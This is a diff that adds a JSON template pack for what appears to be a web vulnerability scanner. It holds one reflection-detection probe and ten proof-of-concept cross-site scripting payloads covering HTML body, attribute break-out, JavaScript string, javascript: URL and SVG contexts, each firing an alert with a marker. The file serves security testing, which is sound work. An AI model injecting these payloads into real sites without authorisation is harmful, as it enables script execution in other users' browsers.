@@ -1,0 +1,121 @@
+{
+  "pack": "builtin-xss",
+  "category": "xss",
+  "source": "builtin",
+  "license": "MIT",
+  "templates": [
+    {
+      "id": "xss-html-marker-tag",
+      "name": "HTML marker tag (reflection probe)",
+      "category": "xss",
+      "context": "html",
+      "mode": "detection",
+      "template": "<poad-<<POAD_MARKER>>>",
+      "required": ["marker"],
+      "tags": ["detection"],
+      "notes": "A non-script custom tag; if it appears unescaped in HTML the sink reflects raw markup."
+    },
+    {
+      "id": "xss-html-script",
+      "name": "HTML body script",
+      "category": "xss",
+      "context": "html",
+      "mode": "poc",
+      "template": "<script>alert('<<POAD_MARKER>>')</script>",
+      "required": ["marker"],
+      "tags": ["poc"]
+    },
+    {
+      "id": "xss-html-img-onerror",
+      "name": "HTML img onerror",
+      "category": "xss",
+      "context": "html",
+      "mode": "poc",
+      "template": "<img src=x onerror=alert('<<POAD_MARKER>>')>",
+      "required": ["marker"],
+      "tags": ["poc"]
+    },
+    {
+      "id": "xss-html-svg-onload",
+      "name": "HTML svg onload",
+      "category": "xss",
+      "context": "html",
+      "mode": "poc",
+      "template": "<svg onload=alert('<<POAD_MARKER>>')>",
+      "required": ["marker"],
+      "tags": ["poc"]
+    },
+    {
+      "id": "xss-attr-breakout-double",
+      "name": "Attribute break-out (double quote)",
+      "category": "xss",
+      "context": "html-attribute",
+      "mode": "poc",
+      "template": "\"><svg onload=alert('<<POAD_MARKER>>')>",
+      "required": ["marker"],
+      "tags": ["poc", "quote:double"]
+    },
+    {
+      "id": "xss-attr-breakout-single",
+      "name": "Attribute break-out (single quote)",
+      "category": "xss",
+      "context": "html-attribute",
+      "mode": "poc",
+      "template": "'><svg onload=alert('<<POAD_MARKER>>')>",
+      "required": ["marker"],
+      "tags": ["poc", "quote:single"]
+    },
+    {
+      "id": "xss-attr-event-noquote",
+      "name": "Attribute event handler (unquoted)",
+      "category": "xss",
+      "context": "html-attribute",
+      "mode": "poc",
+      "template": " onmouseover=alert('<<POAD_MARKER>>') ",
+      "required": ["marker"],
+      "tags": ["poc", "quote:none"],
+      "notes": "For unquoted attribute values; relies on injecting a new event handler."
+    },
+    {
+      "id": "xss-js-breakout",
+      "name": "JS string break-out",
+      "category": "xss",
+      "context": "js-string",
+      "mode": "poc",
+      "template": "';alert('<<POAD_MARKER>>');//",
+      "required": ["marker"],
+      "tags": ["poc", "quote:single"]
+    },
+    {
+      "id": "xss-js-breakout-double",
+      "name": "JS string break-out (double)",
+      "category": "xss",
+      "context": "js-string",
+      "mode": "poc",
+      "template": "\";alert('<<POAD_MARKER>>');//",
+      "required": ["marker"],
+      "tags": ["poc", "quote:double"]
+    },
+    {
+      "id": "xss-url-javascript",
+      "name": "javascript: URL",
+      "category": "xss",
+      "context": "url",
+      "mode": "poc",
+      "template": "javascript:alert('<<POAD_MARKER>>')",
+      "required": ["marker"],
+      "tags": ["poc"],
+      "notes": "For href/src sinks that accept URLs."
+    },
+    {
+      "id": "xss-svg-script",
+      "name": "SVG script",
+      "category": "xss",
+      "context": "svg",
+      "mode": "poc",
+      "template": "<svg><script>alert('<<POAD_MARKER>>')</script></svg>",
+      "required": ["marker"],
+      "tags": ["poc"]
+    }
+  ]
+}
